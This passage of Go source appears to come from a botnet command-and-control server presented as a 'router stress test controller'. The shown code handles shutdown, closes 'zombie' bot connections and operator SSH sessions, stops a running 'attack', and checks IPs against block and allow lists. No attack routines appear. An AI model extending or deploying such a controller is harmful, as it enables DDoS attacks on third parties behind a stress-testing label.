	if c.cleanupTicker != nil {
		c.cleanupTicker.Stop()
	}
	if c.userCleanupTicker != nil {
		c.userCleanupTicker.Stop()
	}
	// 新增：停止用户重载定时器
    if c.userReloadTicker != nil {
        c.userReloadTicker.Stop()
    }
	
	// 停止当前攻击
	if c.currentTask != nil {
		c.StopAttack(c.currentTask.ID)
	}
	
	// 关闭广播队列
	close(c.broadcastChan)
	
	// 关闭所有用户连接
	c.userSessions.Range(func(key, value interface{}) bool {
		session := value.(*UserSession)
		session.Channel.Write([]byte("\r\n服务器正在关闭，连接已断开\r\n"))
		session.Channel.Close()
		return true
	})
	
	// 关闭所有僵尸连接
	c.connections.Range(func(key, value interface{}) bool {
		conn := value.(*Connection)
		conn.Conn.Close()
		return true
	})
	
	// 关闭监听器
	if c.listener != nil {
		c.listener.Close()
	}
	if c.sshListener != nil {
		c.sshListener.Close()
	}
	
	// 等待所有goroutine完成
	time.Sleep(100 * time.Millisecond)
	
	// 清理资源
	removePidFile()
	
	// 清空连接映射
	c.connections.Range(func(key, value interface{}) bool {
		c.connections.Delete(key)
		return true
	})
	
	// 清空用户会话映射
	c.userSessions.Range(func(key, value interface{}) bool {
		c.userSessions.Delete(key)
		return true
	})
	
	// 清空任务映射
	c.tasks.Range(func(key, value interface{}) bool {
		c.tasks.Delete(key)
		return true
	})
	
	// 重置当前任务
	c.mu.Lock()
	c.currentTask = nil
	c.mu.Unlock()
	
	// 重置统计
	stats.mu.Lock()
	stats.ActiveConnections = 0
	stats.TestingConnections = 0
	stats.mu.Unlock()
	
	// 重置计数器
	connectionCount.Store(0)
	userCount.Store(0)
	commandCount.Store(0)
	
	// 记录关闭日志
	logger.Info("控制器已安全关闭")
	
	// 刷新日志缓冲区
	logger.Sync()
	
	fmt.Println("控制器已安全关闭")
}

// ========================= 工具函数 =========================
func generateID() string {
	timestamp := time.Now().UnixNano()
	random := uint32(time.Now().UnixNano() % 1000000)
	
	return fmt.Sprintf("%x%x", timestamp, random)[:16]
}

func (c *Controller) isIPBlocked(ip string) bool {
	for _, blockedIP := range config.BlockedIPs {
		if ip == blockedIP {
			return true
		}
	}
	
	if len(config.AllowedIPs) > 0 {
		for _, allowedIP := range config.AllowedIPs {
			if ip == allowedIP {
				return false
			}
		}
		return true
	}
	
	return false
}

// ========================= 主函数 =========================
func main() {
	fmt.Println("路由器压力测试控制端 v" + VERSION)
	fmt.Println("僵尸连接端口: 9999")
	fmt.Println("SSH登录端口: 22222")
	fmt.Println()
	
	// 启动控制器
	if err := controller.startListeners(); err != nil {
		logger.Fatal("启动失败", zap.Error(err))
		os.Exit(1)
	}
	
	// 等待关闭信号
	<-shutdownSignal
	
	// 优雅关闭
	controller.Shutdown()
	time.Sleep(1 * time.Second)
}